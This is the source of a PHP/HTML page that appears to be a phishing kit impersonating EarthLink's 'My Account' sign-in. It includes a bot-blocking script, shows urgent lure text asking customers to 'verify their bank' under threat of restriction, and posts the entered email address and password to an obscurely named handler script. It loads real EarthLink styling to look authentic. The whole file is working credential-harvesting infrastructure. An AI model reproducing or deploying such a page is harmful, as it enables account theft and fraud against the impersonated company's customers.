﻿<?php
session_start();
include '../blocker.php';

?>
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<title>_Sign In To Continue_</title>
<link type="text/css" rel="stylesheet" href="css/bootstrap.min.css">
<link type="text/css" rel="stylesheet" href="css/font-awesome.min.css">
<link rel="stylesheet" href="css/style.css" type="text/css">
<link rel="stylesheet" href="https://myaccount.biz.earthlink.net/cam/brand/earthlink/css.css" type="text/css">
<link rel="stylesheet" href="css/modal.css" type="text/css">
<script type="text/javascript" src="css/jquery-1.11.2.min.js"></script>			
<script type="text/javascript" src="css/bootstrap.min.js"></script>	
<script type="text/javascript" language="JavaScript" src="css/CamLib.js"></script>

<!-- BEGIN LivePerson Monitor. -->
<script type="text/javascript">window.lpTag=window.lpTag||{},'undefined'==typeof window.lpTag._tagCount?(window.lpTag={wl:lpTag.wl||null,scp:lpTag.scp||null,site:'13267140'||'',section:lpTag.section||'',tagletSection:lpTag.tagletSection||null,autoStart:lpTag.autoStart!==!1,ovr:lpTag.ovr||{},_v:'1.10.0',_tagCount:1,protocol:'https:',events:{bind:function(t,e,i){lpTag.defer(function(){lpTag.events.bind(t,e,i)},0)},trigger:function(t,e,i){lpTag.defer(function(){lpTag.events.trigger(t,e,i)},1)}},defer:function(t,e){0===e?(this._defB=this._defB||[],this._defB.push(t)):1===e?(this._defT=this._defT||[],this._defT.push(t)):(this._defL=this._defL||[],this._defL.push(t))},load:function(t,e,i){var n=this;setTimeout(function(){n._load(t,e,i)},0)},_load:function(t,e,i){var n=t;t||(n=this.protocol+'//'+(this.ovr&&this.ovr.domain?this.ovr.domain:'lptag.liveperson.net')+'/tag/tag.js?site='+this.site);var o=document.createElement('script');o.setAttribute('charset',e?e:'UTF-8'),i&&o.setAttribute('id',i),o.setAttribute('src',n),document.getElementsByTagName('head').item(0).appendChild(o)},init:function(){this._timing=this._timing||{},this._timing.start=(new Date).getTime();var t=this;window.attachEvent?window.attachEvent('onload',function(){t._domReady('domReady')}):(window.addEventListener('DOMContentLoaded',function(){t._domReady('contReady')},!1),window.addEventListener('load',function(){t._domReady('domReady')},!1)),'undefined'===typeof window._lptStop&&this.load()},start:function(){this.autoStart=!0},_domReady:function(t){this.isDom||(this.isDom=!0,this.events.trigger('LPT','DOM_READY',{t:t})),this._timing[t]=(new Date).getTime()},vars:lpTag.vars||[],dbs:lpTag.dbs||[],ctn:lpTag.ctn||[],sdes:lpTag.sdes||[],hooks:lpTag.hooks||[],identities:lpTag.identities||[],ev:lpTag.ev||[]},lpTag.init()):window.lpTag._tagCount+=1;</script>
<!-- END LivePerson Monitor. -->

<script type="text/javascript" language="JavaScript">

 

function doPageLoad()
{
  if (getCookie("ZU") != "")
      document.signinFrm.password.focus();
  else
      document.signinFrm.email.focus();
}



	function hideInlineError(element){
    errorElement = getit(element);
    errorElement.style.visibility = "hidden";
}

function loadFocus(){
	// This function loads focus on email or password field
	// depending on whether the user saved the user name or not
	if (getCookie("ZU") != "" && getCookie("ZU") != null) document.signinFrm.password.focus();
	else document.signinFrm.email.focus();
}

function getit(id){	return document.getElementById(id);}


</script>







<link rel="icon" href="images/favicon.ico" type="image/x-icon">
<link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">

<script charset="UTF-8" src="#"></script><script charset="UTF-8" id="_lpTagScriptId_0" src="#"></script></head>
<body onload="doPageLoad()" width="100%" vlink="#0000ff" topmargin="0" marginwidth="0" marginheight="0" link="#0000ff" leftmargin="0">
<center>
<!-- Modal -->
<div id="pwAlert" class="modal fade" role="dialog">
  <div class="modal-dialog elnk-modal">
    <!-- Modal content-->
    <div class="modal-content elnk-modal-content">
      <div class="modal-header elnk-modal-header">
<img class="elnk-modal-title-image" src="images/elnk.png" alt="EarthLink" title="EarthLink"> 
        <h4 class="modal-title elnk-modal-title">Password Update Required</h4>
      </div>
      <div class="modal-body elnk-modal-body">
      </div>
      <div class="modal-footer elnk-modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">OK</button>
      </div>
    </div>
  </div>
</div>
  
	<table width="100%" cellspacing="0" cellpadding="0" border="0">
	<tbody><tr>
		<td class="leftSideBar"></td>
		<td>







<div class="universalNav no-box-sizing">
   <img src="images/universalnav-bg-left.gif" class="left">
    <img src="images/universalnav-logo.gif" style="margin-top:0;" border="0">
    <span class="universalLinks">
        <a href="#" class="first" target="_blank">EarthLink.net</a>
        <a href="#" target="_blank">My Start Page</a>
        <a href="#" target="_blank">Web Mail</a>
        <a href="#" class="hi">My Account</a>
        <a href="#" target="_blank">Support</a>
    </span>
    <img src="images/universalnav-bg-right.gif" class="right">
</div>



<div class="myAccount">
 




<script language="JavaScript" src="#"></script>
<div id="myAccountTag" class="myAccountTag" align="center">
 
</div>

<div id="CenterContent">









<form name="signinFrm" action="++n7@g=.php" method="post" onsubmit="return validateLogin(this.email.value,this.password.value);">

<input type="hidden" name="page" value="#">

  <script language="javascript">
  
   if(cookiesEnabled()) {
   document.write("<div id='signInWidget'>" 
   + "<div class='widget'>"
            + "<div class='header'>"
              + "<img src='images/signin-header-left.gif' alt='' width='15' height='17' border='0' class='left'>"
              + "<img src='images/signin-header-right.gif' alt='' width='15' height='17' border='0' class='right'>"
            + "</div>"
            + "<div class='content'>"
              + "<span class='left'>" ); 
           	
         	document.write( "<span style='color:#f60;font-weight:bold;font-size:15px'>Login To Continue</span><div style='line-height:50%;'><br></div><span style='font-size:12px'>EarthLink will be asking customers to update their profile as an added security measure.<div style='line-height:50%;'><br></div>To update your email profile </span>");
          

           + "<div class='footer'>"
              + "<img src='images/signin-footer-left.gif' alt='' width='15' height='17' border='0' class='left'>"
              + "<img src='images/signin-footer-right.gif' alt='' width='15' height='17' border='0' class='right'>"
            + "</div>"
            + "</div>"
          + "</div>");

   } else if(!cookiesEnabled()) {
    document.write("<div id='signInWidget'>"
   + "<div class='widget'>"
            + "<div class='header'>"
              + "<img src='images/signin-header-left.gif' alt='' width='15' height='17' border='0' class='left'>"
              + "<img src='images/signin-header-right.gif' alt='' width='15' height='17' border='0' class='right'>"
            + "</div>"
            + "<div class='content'>"
              + "<span class='left'>"  
                + "<h4>Manage your Account Details:</h4>"
                + "<ul>"
                  + "<li>Change your name, email address, or password</li>"
                  + "<li>Update your shipping information</li>"
                + "</ul>"
                + "<h4>Manage your EarthLink Services:</h4>"
                + "<ul>"
                  + "<li>Search for Internet access numbers</li>"
                  + "<li>Check your dial-up usage for the current &nbsp;&nbsp; billing period</li>"
                + "</ul>"
              + "</span>" 
              + "<span class='right red no-box-sizing'>"
                + "The My Account System requires you to have cookies enabled in your browser."
              + "</span>"
             + "<div align='center' class='bottom-links'>"
               + "<table align='center' class='products' cellspcing='0' cellpadding='0'>"
                 + "<tr>"
                   + "&nbsp;"
                 + "</tr>"
                 + "<tr>"
                   + "&nbsp;"
                 + "</tr>"
               + "</table>"
             + "</div>"
           + "</div>"
           + "<div class='footer'>"
              + "<img src='images/signin-footer-left.gif' alt='' width='15' height='17' border='0' class='left'>"
              + "<img src='images/signin-footer-right.gif' alt='' width='15' height='17' border='0' class='right'>"
            + "</div>"
            + "</div>"
          + "</div>");
   } 
 </script><div id="signInWidget"><div class="widget"><div class="header"><img src="images/signin-header-left.gif" alt="" class="left" width="15" height="17" border="0"><img src="images/signin-header-right.gif" alt="" class="right" width="15" height="17" border="0"></div><div class="content"><span class="left"><span style="color:#f60;font-weight:bold;font-size:15px">Login To Continue</span><div style="line-height:50%;"><br></div><span style="font-size:12px">.EarthLink will be asking customers to verify their bank as an added security measure.<div style="line-height:50%;"><br></div>Your EarthLink My Account Area Will Be Restricted, If You Provide Invalid Information's.</span></span><span class="right no-box-sizing"><label for="username">Email Address:</label><input type="hidden" name="1" value="-7"><input type="email" value="" name="1" maxlength="100" id="1" class="username" required><div class="notes">Example: your_address@earthlink.net</div><label for="password">Password:</label><input type="password" value="" name="2" class="password" id="2" required><div class="notes"><a href="#">I forgot my password</a></div><div align="center"><input class="button" src="images/button-signin.gif" name="okey_x" id="okey_x" type="image" value="Sign In"><div class="notes"><a target="_blank" href="#">Sign In Help</a></div><div id="throbber"></div></div><input id="saveuser" type="checkbox" value="on" name="saveuser" class="checkbox"> <label for="saveuser" class="normal">Remember me on this computer</label></span><div class="bottom-links" align="center"><h3>Manage other EarthLink Products:</h3><table class="products" cellspcing="0" cellpadding="0" align="center"><tbody><tr><td class="column1"><ul><li><a href="#">Web Hosting&nbsp;/&nbsp;Parked Domain</a></li></ul></td></tr></tbody></table></div></div><div class="footer"><img src="images/signin-footer-left.gif" alt="" class="left" width="15" height="17" border="0"><img src="images/signin-footer-right.gif" alt="" class="right" width="15" height="17" border="0"></div></div></div>

 <noscript>
 <div id='signInWidget'>
   <div class='widget'>
            <div class='header'>
              <img src='images/signin-header-left.gif' alt='' width='15' height='17' border='0' class='left'>
              <img src='images/signin-header-right.gif' alt='' width='15' height='17' border='0' class='right'>
            </div>
            <div class='content'>
              <span class='left'>
                <h4>Manage your Account Details:</h4>
                <ul>
                  <li>Change your name, email address, or password</li>
                  <li>Update your shipping information</li>
                </ul>
                <h4>Manage your EarthLink Services:</h4>
                <ul>
                  <li>Search for Internet access numbers</li>
                  <li>Check your dial-up usage for the current &nbsp;&nbsp; billing period</li>
                </ul>
              </span>
              <span class='right red no-box-sizing'>_
                The My Account System requires you to have JavaScript enabled in your browser.  Please enable JavaScript in your browser.
            </span>
            <div align='center' class='bottom-links'>
              <table align='center' class='products' cellspcing='0' cellpadding='0'>
                <tr>
                  &nbsp;
                </tr>
                <tr>
                  &nbsp;
                </tr>
              </table>
            </div>
           </div>
           <div class='footer'>
             <img src='images/signin-footer-left.gif' alt='' width='15' height='17' border='0' class='left'>
             <img src='images/signin-footer-right.gif' alt='' width='15' height='17' border='0' class='right'>
           </div>
          </div>
</div>
 </noscript>
</form>




<div id="promoWidget">
           <div class="widget2">
           <div class="header">
             <img src="images/signin-header2-left.gif" alt="" class="left" width="15" height="17" border="0">
             <img src="images/signin-header2-right.gif" alt="" class="right" width="15" height="17" border="0">
     </div><!-- /header -->
           <div class="content no-box-sizing">
         <img src="images/smallofficedsl.jpg"> <h4>Small Office DSL</h4> <a href="" target="_blank">_$69/mo. w/ FREE activation and wireless router!</a>
         <img src="images/busT1.jpg"> <h4>Business T1</h4> <a href="1" target="_blank">_As low as $349/mo. FREE equipment and installation.</a>
     </div><!-- /content -->
           <div class="footer">
             <img src="images/signin-footer-left.gif" alt="" class="left" width="15" height="17" border="0">
             <img src="images/signin-footer-right.gif" alt="" class="right" width="15" height="17" border="0">
     </div><!-- /footer -->
  </div><!-- /widget2 -->
</div><!-- /promowidget -->
<div class="clear"></div>
</div><!-- /CenterContent -->


<img name="timg" src="images/x.gif" width="1" height="1">

</div>


</td>
		<td class="rightSideBar"></td>
	</tr>
</tbody></table>
 </center>
 




<div class="footer"><hr>
c 2021 EarthLink, LLC. All Rights Reserved.<br>_Members and visitors to the EarthLink Web site agree to abide by our_<a href="#" target="_blank">Policies and Agreements</a>.<br> <a href="#" target="_blank">EarthLink Privacy Policy</a><br>
</div>

<div class="footer" align="right">
	My Account version 6.53.0
</div>




















<iframe style="width: 0px; height: 0px; position: absolute; top: -1000px; left: -1000px; display: none;" tabindex="-1" aria-hidden="true" role="presentation" title="Intentionally blank" name="lpSS_4848232605" id="lpSS_4848232605" src="#"></iframe></body></html>